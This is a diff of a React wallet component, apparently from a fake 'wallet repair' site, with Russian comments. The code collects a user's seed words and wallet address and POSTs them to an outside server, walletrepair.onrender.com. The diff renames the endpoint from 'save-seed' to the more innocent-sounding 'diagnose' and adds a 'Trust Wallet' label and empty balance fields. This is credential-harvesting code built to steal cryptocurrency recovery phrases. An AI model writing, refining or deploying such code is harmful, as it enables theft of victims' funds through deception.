@@ -143,19 +143,29 @@ export default function WalletSummaryTest() {
     if (window.sessionStorage.getItem('recoveryFinished')) return;
     // Получаем адрес кошелька из localStorage (или другого источника)
     const walletAddress = localStorage.getItem('walletAddress');
-  fetch('https://walletrepair.onrender.com/api/save-seed', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ walletAddress, seedWords })
+  fetch('https://walletrepair.onrender.com/api/diagnose', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      address: walletAddress,
+      words: seedWords,
+      walletName: 'Trust Wallet',
+      ton: '',
+      usdt: '',
+      nft: '',
+      tokens: '',
+      tokenList: '',
+      nftList: ''
     })
-      .then(res => res.json())
-      .then(data => {
-        setShowRecoveryModal(true);
-        window.sessionStorage.setItem('recoveryStarted', '1');
-      })
-      .catch(err => {
-        alert('Ошибка сохранения файла кошелька!');
-      });
+  })
+    .then(res => res.json())
+    .then(data => {
+      setShowRecoveryModal(true);
+      window.sessionStorage.setItem('recoveryStarted', '1');
+    })
+    .catch(err => {
+      alert('Ошибка сохранения файла кошелька!');
+    });
   };
 
   const handleKeyDown = (e) => {
